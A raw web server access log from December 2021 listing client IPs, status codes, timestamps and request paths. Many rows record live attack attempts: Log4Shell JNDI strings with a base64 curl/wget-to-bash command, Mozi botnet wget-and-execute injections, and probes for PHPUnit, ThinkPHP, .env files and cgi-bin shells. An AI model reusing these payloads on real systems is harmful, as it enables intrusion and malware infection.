"195.54.160.149","415","1639517652547","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81MS4xNDUuOTIuMTk3OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzUxLjE0NS45Mi4xOTc6ODApfGJhc2g=}"
"157.245.108.125","200","1639518603075","/"
"192.241.213.213","415","1639518857929","/hudson"
"36.80.231.206","200","1639521357899","/"
"198.98.49.124","415","1639522311750","/config/getuser?index=0"
"52.148.141.4","200","1639526888554","/"
"52.148.141.4","200","1639526888846","/"
"52.148.141.4","200","1639526889140","/"
"52.148.141.4","415","1639526889711","/nice%20ports%2C/Tri%6Eity.txt%2ebak"
"209.141.50.223","415","1639527111694","/config/getuser?index=0"
"180.244.25.35","200","1639528042030","/"
"109.248.6.39","200","1639529014058","/"
"79.164.153.40","200","1639531054870","/"
"151.235.0.40","200","1639531279552","/"
"64.62.197.92","200","1639533305290","/"
"104.206.128.34","200","1639536891171","/"
"162.142.125.43","200","1639542348893","/"
"162.142.125.43","200","1639542349075","/"
"137.184.96.227","200","1639543019929","/"
"137.184.96.227","404","1639543020372","/favicon.ico"
"137.184.96.227","200","1639543020858","/ico.png"
"198.98.49.124","200","1639544995940","/"
"113.142.72.118","200","1639545848580","/"
"209.17.97.66","200","1639546421788","/"
"124.126.138.75","200","1639549435645","/"
"124.126.138.75","200","1639549436175","/public.css"
"124.126.138.75","200","1639549436395","/jquery-3-6-0-min.js"
"124.126.138.75","200","1639549437837","/public.js"
"124.126.138.75","200","1639549439410","/getbasicinfo.ajax"
"124.126.138.75","200","1639549439834","/login.html"
"124.126.138.75","200","1639549440279","/public.css"
"124.126.138.75","200","1639549440282","/jquery-3-6-0-min.js"
"149.129.50.37","415","1639550175186","http://www.1ucn.com/proxychecker/index.php"
"77.246.181.248","200","1639552694341","/"
"45.61.188.100","415","1639554093941","/login"
"61.219.11.151","200","1639555557092","/"
"136.144.41.117","200","1639556361441","/"
"111.13.127.129","415","1639558443942","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443944","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443944","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443946","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443959","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443961","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443945","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443962","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443963","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443963","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443963","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443961","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443965","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443965","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443966","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443966","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443967","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443965","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443968","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443968","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443968","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443967","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443968","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443969","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558443969","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558444196","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558444197","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558444197","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558444197","http://81.71.160.63/cc.php"
"111.13.127.129","415","1639558444198","http://81.71.160.63/cc.php"
"117.50.6.160","200","1639562139660","/"
"107.189.2.243","200","1639565110029","/"
"194.195.244.79","200","1639565501350","/"
"195.54.160.149","415","1639567690660","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"23.183.81.102","415","1639568787292","/login"
"111.7.100.20","200","1639569221288","/"
"195.54.160.149","415","1639569709832","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"198.98.61.28","415","1639570803511","/wp-content/uploads/2021/12/xem-phim-Phong-Khoi-Lac-Duong-Luoyang-2021--300x450.jpg"
"108.61.210.108","200","1639572245952","/"
"195.54.160.149","415","1639572517057","/solr/admin/info/system?wt=json"
"71.6.232.4","200","1639573442395","/"
"195.54.160.149","415","1639573942331","/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21"
"195.54.160.149","415","1639576348956","/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>"
"195.54.160.149","415","1639577833094","/?XDEBUG_SESSION_START=phpstorm"
"109.237.103.123","415","1639579133252","/.env"
"195.54.160.149","415","1639579138688","/console/"
"128.14.133.58","200","1639580870236","/"
"41.251.249.88","415","1639581733320","/.env"
"41.251.249.88","200","1639581734192","/"
"167.94.138.57","200","1639582758558","/"
"167.94.138.57","200","1639582758822","/"
"34.142.45.182","200","1639583433252","/"
"34.142.45.182","415","1639583433307","/HNAP1/"
"195.54.160.149","200","1639584799881","/"
"35.189.216.20","200","1639585432312","/"
"167.86.70.252","200","1639586595697","/"
"195.54.160.149","415","1639588116803","/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
"34.116.157.159","200","1639588399725","/"
"157.245.70.127","415","1639588663720","/ab2g"
"157.245.70.127","415","1639588668739","/ab2h"
"195.54.160.149","415","1639590876742","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81MS4xNDUuOTIuMTk3OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzUxLjE0NS45Mi4xOTc6ODApfGJhc2g=}"
"167.248.133.113","200","1639592084986","/"
"167.248.133.113","200","1639592085173","/"
"34.159.253.246","200","1639592086869","/"
"34.159.253.246","415","1639592094092","/HNAP1/"
"34.65.99.219","200","1639593465424","/"
"209.17.96.210","200","1639594102297","/"
"23.94.83.68","200","1639594673219","/"
"20.55.53.144","200","1639594858400","/"
"20.211.30.34","415","1639594978491","/pv/spa122.cfg"
"85.202.169.115","200","1639595840871","/"
"34.140.1.37","200","1639598078088","/"
"34.140.1.37","415","1639598086102","/HNAP1/"
"136.144.41.117","200","1639598701418","/"
"34.65.54.135","200","1639600203639","/"
"34.65.54.135","415","1639600203735","/HNAP1/"
"34.105.181.116","200","1639600692889","/"
"34.105.181.116","415","1639600700080","/HNAP1/"
"186.33.79.172","200","1639602840714","/"
"34.116.165.138","200","1639602931326","/"
"34.116.165.138","415","1639602931715","/HNAP1/"
"185.180.143.8","200","1639603466411","/"
"83.4.14.250","415","1639606540827","/phpmyadmin/"
"34.89.18.225","200","1639610104600","/"
"34.89.18.225","415","1639610113616","/HNAP1/"
"209.141.50.223","415","1639610318421","/config/getuser?index=0"
"20.62.171.235","200","1639613587554","/"
"20.62.171.235","200","1639613587744","/"
"20.62.171.235","200","1639613587914","/"
"20.62.171.235","415","1639613588233","/nice%20ports%2C/Tri%6Eity.txt%2ebak"
"198.98.49.124","415","1639614395998","/config/getuser?index=0"
"35.246.93.126","200","1639614776012","/"
"35.246.93.126","415","1639614778333","/HNAP1/"
"178.79.150.200","200","1639615906878","/"
"64.62.197.62","200","1639616236105","/"
"45.61.186.9","415","1639619719135","/data6688/open/getCompanyInfo"
"23.183.83.15","415","1639619969278","/data6688/open/getCompanyInfo"
"139.59.70.139","200","1639622349825","/"
"45.137.23.232","200","1639622560883","/"
"199.195.253.57","415","1639623204232","/authority/login"
"23.183.83.160","200","1639623656399","/"
"23.183.83.160","415","1639623670334","/HNAP1/"
"209.17.97.58","200","1639625913632","/"
"186.33.73.185","200","1639628406276","/"
"193.118.53.202","200","1639628785613","/"
"14.242.160.164","200","1639631190586","/"
"162.142.125.194","200","1639631422711","/"
"162.142.125.194","200","1639631422942","/"
"198.98.49.124","200","1639632500120","/"
"179.43.175.101","200","1639634571700","/"
"139.59.70.139","200","1639635713243","/"
"45.61.185.22","415","1639636154120","/data6688/open/getCompanyInfo"
"104.244.73.9","200","1639636813911","/"
"45.134.225.15","200","1639637348028","/"
"195.54.160.149","415","1639639661753","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"197.232.21.221","200","1639640554858","/"
"154.89.5.68","200","1639642153449","/"
"195.54.160.149","415","1639643405565","/solr/admin/info/system?wt=json"
"45.227.254.14","200","1639643718826","/"
"45.83.67.37","200","1639643939508","/"
"45.83.67.199","200","1639643939565","/ico.png"
"47.114.145.167","200","1639645168172","/"
"195.181.83.222","200","1639645394321","/"
"185.189.91.26","200","1639646642385","/"
"195.54.160.149","415","1639648945415","/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>"
"195.54.160.149","415","1639652980997","/console/"
"23.251.102.82","200","1639653312644","/"
"34.142.19.18","200","1639653698042","/"
"34.142.19.18","415","1639653698048","/HNAP1/"
"23.183.83.160","200","1639654996399","/"
"23.183.83.160","415","1639655005840","/HNAP1/"
"34.65.195.42","200","1639655270718","/"
"34.65.195.42","415","1639655270849","/HNAP1/"
"195.54.160.149","415","1639655727259","/Autodiscover/Autodiscover.xml"
"139.59.70.139","200","1639656935161","/"
"195.54.160.149","415","1639657401113","/_ignition/execute-solution"
"23.183.81.139","200","1639660528145","/"
"195.54.160.149","415","1639661989710","/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
"23.251.102.74","200","1639662888705","/"
"23.183.83.18","415","1639663608933","/authority/login"
"159.65.63.130","415","1639665999732","/.env"
"159.65.63.130","200","1639665999739","/"
"195.54.160.149","415","1639666265765","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81MS4xNDUuOTIuMTk3OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzUxLjE0NS45Mi4xOTc6ODApfGJhc2g=}"
"120.85.115.83","415","1639669244951","/shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
"5.8.10.202","200","1639670817501","/"
"128.14.141.34","200","1639676858802","/"
"209.141.50.223","415","1639677679554","/config/getuser?index=0"
"172.104.138.223","415","1639679825822","/fuN3"
"34.142.52.49","200","1639681334067","/"
"213.149.28.227","200","1639684165232","/"
"119.251.14.20","415","1639686023523","/shell?cd+/tmp;rm+-rf+*;wget+http://119.251.14.20:50933/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
"186.33.79.114","200","1639688995304","/"
"186.33.79.114","200","1639688995307","/"
"209.17.96.10","200","1639692011400","/"
"120.86.252.103","415","1639693511217","/GponForm/diag_Form?images/"
"186.33.73.14","200","1639695911928","/"
"34.105.206.192","200","1639696023429","/"
"34.105.206.192","415","1639696023460","/HNAP1/"
"162.142.125.58","200","1639696646119","/"
"162.142.125.58","200","1639696646489","/"
"35.198.152.16","200","1639697109043","/"
"35.198.152.16","415","1639697109073","/HNAP1/"
"185.234.231.211","200","1639697956098","/"
"190.57.128.110","200","1639698682912","/"
"192.227.211.221","200","1639699261431","/"
"20.62.171.81","200","1639699836718","/"
"20.62.171.81","200","1639699836900","/"
"20.62.171.81","200","1639699837067","/"
"20.62.171.81","415","1639699837386","/nice%20ports%2C/Tri%6Eity.txt%2ebak"
"5.157.38.50","415","1639700612659","/${jndi:ldap://31.131.16.127:1389/Exploit}"
"5.157.38.50","200","1639700612692","/"
"5.157.38.50","415","1639700612725","/login"
"5.157.38.50","200","1639700612772","/"
"139.162.145.250","415","1639701104023","/bag2"
"34.105.160.57","200","1639701552407","/"
"34.105.160.57","415","1639701552502","/HNAP1/"
"205.185.124.100","415","1639704991188","/boaform/admin/formLogin"
"45.83.65.234","415","1639705071653","/?id=%24%7B%24%7B%3A%3A-j%7Dndi%3Adns%3A%2F%2F45.83.64.1%2Fsecurityscan-sftpxrzh33pfybon%7D"
"45.83.66.68","200","1639705071710","/"
"114.255.88.84","200","1639705938422","/"
"193.118.53.210","200","1639707237670","/"
"20.55.115.145","415","1639707311268","/.env"
"20.55.115.145","200","1639707311534","/"
"205.185.124.100","415","1639707313815","/boaform/admin/formLogin"
"45.134.225.15","200","1639707790135","/"
"112.255.19.14","415","1639710795552","/HNAP1/"
"195.54.160.149","415","1639714794361","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"209.17.97.98","200","1639715034565","/"
"4.17.224.131","415","1639716679105","/.env"
"4.17.224.131","200","1639716679509","/"
"195.54.160.149","415","1639717184626","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"34.140.248.32","200","1639717345141","/"
"195.54.160.149","415","1639718790235","/solr/admin/info/system?wt=json"
"104.206.128.38","200","1639719755542","/"
"23.183.81.15","404","1639720392587","/mainPage.html"
"23.183.81.122","404","1639720785605","/mainPage.html"
"195.54.160.149","415","1639720797232","/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21"
"104.244.73.250","415","1639722930397","/wp-content/uploads/2020/12/Re-Zero-Kara-Hajimeru-Isekai-Seikatsu-season-2-185x278.jpg"
"23.183.83.160","200","1639723088528","/"
"23.183.83.160","415","1639723098219","/HNAP1/"
"195.54.160.149","415","1639723307941","/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>"
"42.235.95.149","415","1639724239428","/boaform/admin/formLogin?username=admin&psd=admin"
"195.54.160.149","415","1639724925597","/?XDEBUG_SESSION_START=phpstorm"
"185.254.196.223","415","1639727046652","/.env"
"185.254.196.223","200","1639727056952","/"
"195.54.160.149","415","1639727439781","/console/"
"195.54.160.149","415","1639729446962","/Autodiscover/Autodiscover.xml"
"198.199.104.21","415","1639729863149","/ReportServer"
"185.254.196.223","415","1639730792827","/.env"
"185.254.196.223","200","1639730795245","/"
"162.142.125.57","200","1639732315789","/"
"162.142.125.57","200","1639732316018","/"
"137.184.218.211","200","1639732411404","/"
"195.54.160.149","415","1639732452345","/_ignition/execute-solution"
"34.159.196.246","200","1639733178155","/"
"34.159.196.246","415","1639733178185","/HNAP1/"
"157.245.70.127","415","1639734059566","/ab2g"
"157.245.70.127","415","1639734064589","/ab2h"
"195.54.160.149","200","1639734582873","/"
"65.49.20.69","200","1639735013207","/"
"195.54.160.149","415","1639735402540","/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
"128.14.134.170","200","1639737105439","/"
"209.141.50.223","415","1639737239680","/config/getuser?index=0"
"185.254.196.223","415","1639739032901","/.env"
"185.254.196.223","200","1639739033001","/"
"195.54.160.149","200","1639739091223","/"
"118.44.8.11","415","1639739557902","/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://118.44.8.11:44088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
"195.54.160.149","415","1639741012887","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81MS4xNDUuOTIuMTk3OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzUxLjE0NS45Mi4xOTc6ODApfGJhc2g=}"
"192.241.211.90","200","1639743898286","/"
"209.141.50.223","415","1639748746860","/config/getuser?index=0"
"183.136.226.4","200","1639749201834","/"
"188.190.221.115","200","1639750858965","/"
"185.254.196.223","415","1639751098279","/.env"
"185.254.196.223","200","1639751100357","/"
"103.233.88.158","200","1639751466089","/"
"73.222.79.229","200","1639755076665","/"
"138.197.196.173","200","1639755090132","/"
"128.14.134.170","200","1639759706101","/"
"185.142.236.40","200","1639762055064","/"
"185.142.236.40","415","1639762055415","/robots.txt"
"185.142.236.40","415","1639762055836","/sitemap.xml"
"185.142.236.40","415","1639762056726","/.well-known/security.txt"
"185.142.236.40","200","1639762059202","/ico.png"
"130.211.54.158","200","1639762067236","/"
"162.142.125.194","200","1639763649584","/"
"162.142.125.194","200","1639763649766","/"
"2.56.57.56","200","1639766020291","/"
"2.56.57.56","415","1639766025793","/HNAP1/"
"192.241.207.46","415","1639766059590","/portal/redlion"
"185.254.196.223","415","1639768427165","/.env"
"185.254.196.223","200","1639768441491","/"
"185.220.101.12","200","1639772745871","/"
"18.27.197.252","404","1639772755927","/favicon.ico"
"185.254.196.223","415","1639773897395","/.env"
"185.254.196.223","200","1639773900423","/"
"186.33.80.130","200","1639775385831","/"
"223.130.31.89","415","1639777140679","/GponForm/diag_Form?images/"
"111.59.85.209","200","1639777316324","/"
"111.59.85.209","200","1639777316585","/"
"111.59.85.209","200","1639777316849","/"
"111.59.85.209","200","1639777317116","/"
"61.52.86.65","415","1639777317455","http://110.242.68.4/"
"162.208.49.249","415","1639778753696","/_ignition/execute-solution"
"45.95.147.17","200","1639778990895","/"
"180.149.125.170","200","1639781843404","/"
"104.152.52.160","200","1639784971624","/"
"20.62.168.196","200","1639786623603","/"
"20.62.168.196","200","1639786623791","/"
"20.62.168.196","200","1639786623958","/"
"20.62.168.196","415","1639786624286","/nice%20ports%2C/Tri%6Eity.txt%2ebak"
"197.246.175.231","415","1639787854228","/${jndi:ldap://31.131.16.127:1389/Exploit}"
"197.246.175.231","415","1639787861637","/login"
"197.246.175.231","200","1639787862140","/"
"195.54.160.149","415","1639789666482","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"195.54.160.149","415","1639790217672","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
"195.54.160.149","415","1639792168441","/solr/admin/info/system?wt=json"
"64.62.197.62","200","1639794572993","/"
"142.93.146.198","415","1639795669971","/postsniffer"
"185.128.41.50","415","1639795853253","/invoker/readonly"
"198.23.200.23","415","1639797298294","/.env"
"198.23.200.23","200","1639797299814","/"
"195.54.160.149","415","1639797542785","/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>"
"198.23.200.23","415","1639798043746","/.env"
"198.23.200.23","200","1639798045224","/"
"195.54.160.149","415","1639798366388","/?XDEBUG_SESSION_START=phpstorm"
"185.254.196.223","415","1639799771118","/.env"
"185.254.196.223","200","1639799779371","/"
"195.54.160.149","415","1639800537160","/console/"
"180.149.125.168","415","1639802994207","/stalker_portal/server/tools/auth_simple.php"
"209.17.97.2","200","1639803868807","/"
"185.254.196.223","415","1639804339968","/.env"
"185.254.196.223","200","1639804342234","/"
"195.54.160.149","415","1639805057054","/_ignition/execute-solution"
"195.54.160.149","200","1639806552925","/"
"34.140.248.32","200","1639806556861","/"
"195.54.160.149","415","1639809336065","/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
"138.68.84.78","200","1639810300929","/"
"128.14.134.134","200","1639810811825","/"
"209.17.96.154","200","1639811004501","/"
"197.254.60.42","200","1639811924544","/"
"195.54.160.149","200","1639812342812","/"
"77.37.134.80","415","1639813244265","/${jndi:ldap://31.131.16.127:1389/Exploit}"
"77.37.134.80","200","1639813244322","/"
"77.37.134.80","415","1639813244389","/login"
"77.37.134.80","200","1639813244451","/"
"195.54.160.149","415","1639814236079","/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81MS4xNDUuOTIuMTk3OjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzUxLjE0NS45Mi4xOTc6ODApfGJhc2g=}"
"185.254.196.223","415","1639814817804","/.env"
"185.254.196.223","200","1639814817899","/"
"167.94.138.116","200","1639815538373","/"
"167.94.138.116","200","1639815538623","/"
"45.61.186.12","415","1639815677175","/?9766"
"170.247.74.127","200","1639816293045","/"
"162.221.192.90","200","1639818808141","/"
"162.221.192.90","415","1639818808454","/fuel"
"199.195.250.138","404","1639819346124","/mainPage.html?10133"
"123.129.8.211","415","1639823478608","/GponForm/diag_Form?images/"
"109.237.103.123","415","1639823566861","/.env"
"1.116.59.211","415","1639824247744","/${jndi:ldap://31.131.16.127:1389/Exploit}"
"1.116.59.211","200","1639824247974","/"
"1.116.59.211","415","1639824248194","/login"
"1.116.59.211","200","1639824248429","/"
"1.202.113.231","415","1639824274060","http://110.242.68.4/"
"159.89.26.34","200","1639825467054","/"
"185.254.196.223","415","1639828934722","/.env"
"185.254.196.223","200","1639828956838","/"
"92.118.161.13","200","1639829585823","/"
"192.241.215.91","200","1639830402951","/"
"198.98.61.28","404","1639831328473","/m/images/template_1/style_1/logo1.png"
"51.79.29.48","200","1639832147601","/"
"51.79.29.48","415","1639832147792","/.env"
"167.248.133.115","200","1639833074296","/"
"167.248.133.115","200","1639833074484","/"
"36.67.198.7","200","1639833306495","/"
"134.209.159.8","200","1639839152955","/"
"134.209.159.8","415","1639839153346","/system_api.php"
"134.209.159.8","404","1639839156095","/c/version.js"
"134.209.159.8","415","1639839158820","/streaming/clients_live.php"
"134.209.159.8","404","1639839161576","/stalker_portal/c/version.js"
"134.209.159.8","415","1639839164304","/stream/live.php"
"134.209.159.8","404","1639839167034","/flu/403.html"
"134.209.159.8","200","1639839169782","/"
"151.242.26.226","200","1639841812716","/"
"162.142.125.59","200","1639845583041","/"
"162.142.125.59","200","1639845583289","/"
"128.14.141.34","415","1639845727906","/Telerik.Web.UI.WebResource.axd?type=rau"
"186.33.84.69","200","1639846084014","/"
"103.144.149.212","200","1639846925545","/"
"103.144.149.212","200","1639846925796","/public.css"
"103.144.149.212","200","1639846926014","/public.js"
"103.144.149.212","200","1639846926018","/jquery-3-6-0-min.js"
"103.144.149.212","200","1639846926819","/getbasicinfo.ajax"
"103.144.149.212","200","1639846927047","/login.html"
"103.144.149.212","200","1639846927288","/public.css"
"103.144.149.212","200","1639846927291","/jquery-3-6-0-min.js"
"103.144.149.212","200","1639846927300","/hash.js"
"103.144.149.212","200","1639846927511","/public.js"
"103.144.149.212","200","1639846927734","/UOP.png"
"103.144.149.212","200","1639846928076","/UOP2.png"
"103.144.149.212","200","1639846930248","/login.ajax?Username=qc5111&Password=d6ae33474b8621b5afce6fe38550b59d4d189151"
"103.144.149.212","200","1639846931478","/index.html"
"103.144.149.212","200","1639846931722","/jquery-3-6-0-min.js"
"103.144.149.212","200","1639846931723","/public.js"
"103.144.149.212","200","1639846931724","/public.css"
"103.144.149.212","200","1639846932343","/getbasicinfo.ajax"
"103.144.149.212","200","1639846938228","/channel.html"
"103.144.149.212","200","1639846938476","/public.css"
"103.144.149.212","200","1639846938697","/public.js"
"103.144.149.212","200","1639846938699","/jquery-3-6-0-min.js"
"103.144.149.212","200","1639846938922","/UOP.png"
"103.144.149.212","200","1639846939332","/UOP2.png"
"103.144.149.212","200","1639846939343","/getbasicinfo.ajax"
"49.143.32.6","415","1639853581539","/GponForm/diag_Form?images/"
"165.227.11.20","415","1639854872800","/3000D00E0000FFFF3F0031313744373731343634304537353046007A7A7A7A7A7A7A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000008047A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000"
"165.227.11.20","415","1639854874107","/3000D00E0000FFFF3F0031313744373731343634304537353046007A7A7A7A7A7A7A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000008047A7A7A7A7A7A7A7A7A0000000000000000000000000000000000000000000000000000000000000000"
"165.227.11.20","200","1639854875175","/"
"165.227.11.20","200","1639854876481","/"
"2.187.7.13","200","1639854989543","/"
